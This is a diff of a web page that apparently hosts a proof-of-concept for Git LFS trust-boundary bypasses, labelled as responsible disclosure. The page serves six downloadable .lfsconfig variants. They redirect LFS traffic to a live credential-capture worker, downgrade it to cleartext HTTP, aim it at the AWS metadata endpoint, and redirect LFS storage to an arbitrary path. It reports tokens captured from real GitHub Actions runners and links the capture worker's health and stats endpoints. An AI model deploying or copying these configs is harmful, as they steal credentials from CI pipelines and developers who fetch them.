@@ -3,28 +3,112 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>LFS Configuration Test</title>
+<title>LFS Vulnerability PoC — All Variations</title>
 <style>
-body { font-family: system-ui, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0d1117; color: #c9d1d9; }
+body { font-family: system-ui, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; background: #0d1117; color: #c9d1d9; }
 h1 { color: #58a6ff; }
+h2 { color: #f0883e; margin-top: 32px; }
 code { background: #161b22; padding: 2px 6px; border-radius: 4px; color: #f0883e; }
+pre { background: #161b22; padding: 16px; border-radius: 8px; overflow-x: auto; color: #c9d1d9; }
 a { color: #58a6ff; }
 .warning { background: #1c1e21; border: 1px solid #f85149; border-radius: 8px; padding: 16px; margin: 16px 0; }
+.cvss-critical { color: #f85149; font-weight: bold; }
+.cvss-high { color: #f0883e; font-weight: bold; }
+.cvss-medium { color: #d29922; font-weight: bold; }
+table { width: 100%; border-collapse: collapse; margin: 16px 0; }
+th, td { padding: 8px 12px; border: 1px solid #30363d; text-align: left; }
+th { background: #161b22; color: #58a6ff; }
+.variation { margin: 24px 0; padding: 16px; border: 1px solid #30363d; border-radius: 8px; }
+.variation h3 { margin-top: 0; color: #58a6ff; }
 </style>
 </head>
 <body>
-<h1>LFS Configuration Test Repository</h1>
+<h1>Git LFS Vulnerability PoC — All Variations</h1>
 <div class="warning">
-<strong>⚠ Research PoC</strong> — This repository demonstrates Git LFS trust boundary bypass (DSM-002-V1).
+<strong>⚠ Responsible Disclosure PoC</strong> — This repository demonstrates multiple Git LFS trust boundary bypasses.
+Only SHA-256 hashes of credentials are stored. No raw credentials are persisted or output.
 </div>
-<p>This GitHub Pages site serves a <code>.lfsconfig</code> file that redirects Git LFS traffic to an external endpoint.</p>
-<h2>Files served via GitHub Pages CDN</h2>
+
+<h2>Confirmed Vulnerabilities</h2>
+<table>
+<tr><th>ID</th><th>Vulnerability</th><th>CVSS</th><th>Platforms</th><th>Variation</th></tr>
+<tr><td>CH-006</td><td>Pickle Bomb via Cache Poisoning</td><td class="cvss-critical">9.8</td><td>WSL/Win/GH Actions</td><td>V1</td></tr>
+<tr><td>CH-007</td><td>Binary Exec via Cache Poisoning</td><td class="cvss-critical">9.1</td><td>WSL/Win/GH Actions</td><td>V1</td></tr>
+<tr><td>CH-008</td><td>Cross-Repo Cache Poisoning</td><td class="cvss-high">8.6</td><td>WSL/Win/GH Actions</td><td>V1</td></tr>
+<tr><td>DTB-6</td><td>Databricks Secrets Escalation</td><td class="cvss-high">8.2</td><td>Databricks Serverless</td><td>V2</td></tr>
+<tr><td>POC-A</td><td>Credential Interception</td><td class="cvss-high">7.5</td><td>WSL/GH/Databricks</td><td>V1</td></tr>
+<tr><td>DTB-2</td><td>Config Chain Redirect</td><td class="cvss-high">7.5</td><td>All</td><td>V1-V6</td></tr>
+<tr><td>POC-C</td><td>Path Traversal (lfs.storage)</td><td class="cvss-high">7.8</td><td>WSL/Win</td><td>V4</td></tr>
+<tr><td>DTB-3</td><td>Consumer Exec (RCE)</td><td class="cvss-high">7.0</td><td>Databricks Serverless</td><td>V1</td></tr>
+<tr><td>DTB-7</td><td>E2E Chain</td><td class="cvss-medium">6.5</td><td>Databricks Serverless</td><td>V2</td></tr>
+<tr><td>POC-B</td><td>Non-Atomic Smudge Corruption</td><td class="cvss-medium">6.5</td><td>WSL/Win</td><td>V1</td></tr>
+<tr><td>DTB-5</td><td>SSRF/IMDS</td><td class="cvss-medium">5.3</td><td>Databricks Serverless</td><td>V3</td></tr>
+</table>
+
+<h2>.lfsconfig Variations</h2>
+
+<div class="variation">
+<h3>V1 — Credential Capture (POC-A / DTB-2) <span class="cvss-high">CVSS 7.5</span></h3>
+<p>Redirects LFS batch API to capture worker. Intercepts Authorization headers (SHA-256 hashed).</p>
+<p><strong>Proven</strong>: 181 captures, 2 unique tokens from GitHub Actions runners.</p>
+<pre>[lfs]
+  url = https://lfs-capture.everton-win32.workers.dev</pre>
+<p>Served at: <a href=".lfsconfig">.lfsconfig</a></p>
+</div>
+
+<div class="variation">
+<h3>V2 — Databricks LFS Redirect + fetchexclude (DTB-2 + DTB-6) <span class="cvss-high">CVSS 8.2</span></h3>
+<p>Same redirect but with fetchexclude to avoid fetch failures in Serverless. Credentials still captured on batch POST.</p>
+<pre>[lfs]
+  url = https://lfs-capture.everton-win32.workers.dev
+  fetchexclude = *</pre>
+<p>Served at: <a href="v2-databricks-lfsconfig">v2-databricks-lfsconfig</a></p>
+</div>
+
+<div class="variation">
+<h3>V3 — SSRF to AWS IMDS (DTB-5) <span class="cvss-medium">CVSS 5.3</span></h3>
+<p>Redirects LFS to AWS Instance Metadata Service. IP 169.254.169.254 is routable from Databricks Serverless but HTTP is blocked.</p>
+<pre>[lfs]
+  url = http://169.254.169.254/latest/meta-data/</pre>
+<p>Served at: <a href="v3-ssrf-imds-lfsconfig">v3-ssrf-imds-lfsconfig</a></p>
+</div>
+
+<div class="variation">
+<h3>V4 — Path Traversal (POC-C) <span class="cvss-high">CVSS 7.8</span></h3>
+<p>Sets lfs.storage to arbitrary path. Objects written outside .git/lfs/.</p>
+<pre>[lfs]
+  storage = /tmp/lfs-lab-traversal</pre>
+<p>Served at: <a href="v4-path-traversal-lfsconfig">v4-path-traversal-lfsconfig</a></p>
+</div>
+
+<div class="variation">
+<h3>V5 — Azure SSRF via Blocked URL <span class="cvss-medium">CVSS 5.3</span></h3>
+<p>Redirects LFS to Azure-blocked URL. Tests if LFS redirect bypasses network blocks.</p>
+<pre>[lfs]
+  url = https://dev.graco.com</pre>
+<p>Served at: <a href="v5-azure-ssrf-lfsconfig">v5-azure-ssrf-lfsconfig</a></p>
+</div>
+
+<div class="variation">
+<h3>V6 — HTTP Downgrade (DTB-2 HTTP variant) <span class="cvss-high">CVSS 7.5</span></h3>
+<p>Downgrades LFS endpoint from HTTPS to HTTP. Credentials sent in cleartext.</p>
+<pre>[lfs]
+  url = http://lfs-capture.everton-win32.workers.dev</pre>
+<p>Served at: <a href="v6-http-downgrade-lfsconfig">v6-http-downgrade-lfsconfig</a></p>
+</div>
+
+<h2>Supporting Files</h2>
 <ul>
-<li><a href=".lfsconfig">.lfsconfig</a> — LFS URL override</li>
-<li><a href=".gitattributes">.gitattributes</a> — LFS tracking rules</li>
-<li><a href=".gitmodules">.gitmodules</a> — Submodule configuration</li>
+<li><a href=".gitattributes">.gitattributes</a> — LFS tracking rules (*.bin, *.dat)</li>
+<li><a href=".gitmodules">.gitmodules</a> — Submodule URL redirect</li>
+<li><a href=".nojekyll">.nojekyll</a> — Required for GitHub Pages to serve dotfiles</li>
 </ul>
-<h2>Impact</h2>
-<p>Any CI/CD pipeline or developer that downloads and applies this <code>.lfsconfig</code> will have their Git LFS traffic redirected — including credentials sent via Basic auth headers.</p>
+
+<h2>Capture Infrastructure</h2>
+<ul>
+<li><a href="https://lfs-capture.everton-win32.workers.dev/api/health">Worker Health</a></li>
+<li><a href="https://lfs-capture.everton-win32.workers.dev/api/stats?key=lfs-poc-2026">Worker Stats</a></li>
+<li><a href="https://graomelo.github.io/">Dashboard</a></li>
+</ul>
 </body>
 </html>
